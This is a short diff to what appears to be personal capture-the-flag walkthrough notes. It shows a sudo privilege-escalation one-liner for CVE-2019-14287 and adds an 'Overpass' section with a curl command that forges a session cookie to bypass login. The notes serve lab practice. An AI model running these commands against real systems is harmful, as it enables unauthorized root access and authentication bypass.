@@ -169,3 +169,10 @@ sshpass -p '{pw}' ssh {username}@{target IP}
 # the machine have "CVE-2019-14287" vulnerability. so taking advantage this.
 sudo -u#-1 bash
 ```
+
+## Overpass
+
+```bash
+# take advantage the vuln of that any cookie is OK
+curl http://{target page} --cookie "SessionToken=hoge"
+```
